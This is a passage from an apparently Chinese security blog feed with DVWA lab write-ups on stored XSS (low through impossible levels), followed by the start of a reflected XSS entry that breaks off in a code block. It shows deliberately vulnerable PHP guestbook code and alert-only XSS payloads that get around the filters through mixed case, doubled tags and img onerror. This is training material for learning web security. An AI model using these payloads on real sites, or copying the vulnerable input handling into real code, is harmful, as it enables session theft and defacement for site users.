    <content type="html"><![CDATA[<blockquote><p><strong>存储型XSS</strong> :或者叫持久型XSS。顾名思义，相比与反射型XSS,脚本的位置类似网盘文件一样，可以重复使用，方便存取。被保存到服务器上，显示到HTML页面中，经常出现在用户评论的页面，攻击者将XSS代码保存到数据库中，当用户在此访问这个页面时，就会触发并执行XSS代码，窃取用户的敏感信息。</p></blockquote><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><h2 id="请求页面"><a href="#请求页面" class="headerlink" title="请求页面"></a>请求页面</h2><p><img src="/2022/06/06/dvwa-XSS-stored/1692435562829.png" alt="1692435562829"></p><h2 id="响应页面"><a href="#响应页面" class="headerlink" title="响应页面"></a>响应页面</h2><p><img src="/2022/06/06/dvwa-XSS-stored/1692437050174.png" alt="1692437050174"></p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>trim() 函数移除字符串两侧的空白字符或其他预定义字符，charlist 参数可以规定从字符串中删除哪些字符，为空默认移除以下字符</p><ul><li>“\0” - NULL</li><li>“\t” - 制表符</li><li>“\n” - 换行</li><li>“\x0B” - 垂直制表符</li><li>“\r” - 回车</li><li>“ “ - 空格</li></ul><p>stripslashes() 函数用于删除由 addslashes() 函数添加的反斜杠，可用于清理从数据库中或者从 HTML 表单中取回的数据。<br>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL<br>mysqli_real_escape_string() 函数用于对字符串中的特殊字符进行转义，使得这个字符串是一个合法的 SQL 语句。这个函数也算是老朋友了。</li></ul><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>low级别源码仅仅是转义，并没有进行过滤检查。网页会从数据库中取出数据，展示所有的用户的输入数据。</p><ul><li>直接注入。用户每次访问此页面都会运行脚本。| 名称    | 值                                    |<br>| :—— | :———————————— |<br>| Name    | test1                                 |<br>| Message | <code>&lt;script&gt;</code>alert(‘xss’)<code>&lt;/script&gt;</code> |</li></ul><p>值得一提的是，<code>Name</code>以及 <code>Message</code>输入框限制了输入长度10,50。但这仅仅是前端页面限制了长度，可以修改前端或者Burp注入而不受长度限制。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;txtName&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;30&quot;</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">&quot;10&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mtxMessage&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;50&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;3&quot;</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">&quot;50&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。<br>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。预定义的字符是：</p><table><thead><tr><th>&amp; （和号）成为 &amp;</th></tr></thead><tbody><tr><td>“ （双引号）成为 “</td></tr><tr><td>‘ （单引号）成为 ‘</td></tr><tr><td>&lt; （小于）成为 &lt;</td></tr><tr><td>&gt;（大于）成为 &gt;</td></tr></tbody></table><h2 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>可以看到 Message 参数对所有的 XSS 都进行了过滤，但是 name 参数只是过滤了 <code>&lt;script&gt;</code>标签而已，我们可以对 name 参数Burp注入。</p><ul><li>大小写绕过。<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/Script&gt;</code></li><li>双写绕过。<code>&lt;s&lt;script&gt;cript&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>preg_replace() 函数执行一个正则表达式的搜索和替换，“*” 代表一个或多个任意字符，“i” 代表不区分大小写。也就是说 name 参数 “&lt; script &gt;” 标签在这里被完全过滤了。</p><h2 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>我们可以通过其他的标签例如 img、body 等标签的事件或者iframe 等标签的 src 注入 JS 攻击脚本。对name输入：</p><ul><li>img标签注入。<code>&lt;img src = “” onerror = alert(&quot;xss&quot;)&gt;</code></li></ul><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>学习时间到！！</p><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$name</span> );<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:message&#x27;</span>, <span class="hljs-variable">$message</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:name&#x27;</span>, <span class="hljs-variable">$name</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>impossible级别对name和message两个用户输入都进行了同样安全程度的过滤处理，htmlspecialchars()函数立大功。此外，还用到PDO预编译以及Anti-CSRF Token。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS-存储型</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa-XSS-relected</title>
    <link href="/2022/06/06/dvwa-XSS-relected/"/>
    <url>/2022/06/06/dvwa-XSS-relected/</url>
    
    <content type="html"><![CDATA[<blockquote><p>跨站点脚本（XSS）攻击是一种注入攻击，恶意脚本会被注入到可信的网站中。当攻击者使用 web 应用程序将恶意代码（通常以浏览器端脚本的形式）发送给其他最终用户时，就会发生 XSS 攻击。允许这些攻击成功的漏洞很多，并且在 web 应用程序的任何地方都有可能发生，这些漏洞会在使用用户的输入，没有对其进行验证或编码。<br>攻击者可以使用 XSS 向不知情的用户发送恶意脚本，用户的浏览器并不知道脚本不应该被信任，并将执行 JavaScript。因为它认为脚本来自可信来源，所以恶意脚本可以访问浏览器并作用于该站点的任何 cookie、会话令牌或其他敏感信息，甚至可以重写 HTML 页面的内容。</p><p><strong>反射型XSS</strong>:在用户请求某个URL地址的时候，会携带一部分数据。当客户端进行访问某个链接时，攻击者可以将恶意代码注入到URL，如果服务器未对URL携带的参数做判断和过滤，直接返回响应页面，那么XSS攻击代码就会被一起传输到用户的浏览器，触发反射型XSS。</p></blockquote><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><h2 id="请求页面"><a href="#请求页面" class="headerlink" title="请求页面"></a>请求页面</h2><p><img src="/2022/06/06/dvwa-XSS-relected/1692349745882.png" alt="1692349745882"><br>攻击者可以使用 XSS 向不知情的用户发送恶意脚本，用户的浏览器并不知道脚本不应该被信任，并将执行 JavaScript。因为它认为脚本来自可信来源，所以恶意脚本可以访问浏览器并作用于该站点的任何 cookie、会话令牌或其他敏感信息，甚至可以重写 HTML 页面的内容。</p><h2 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/vulnerabilities/xss_r/?name=Jack</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/vulnerabilities/xss_r/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=1ekmlj5hkmfpg44br6ilefo6s2; security=low<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><br></code></pre></td></tr></table></figure><h2 id="响应页面"><a href="#响应页面" class="headerlink" title="响应页面"></a>响应页面</h2><p><img src="/2022/06/06/dvwa-XSS-relected/1692349726329.png" alt="1692349726329"></p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 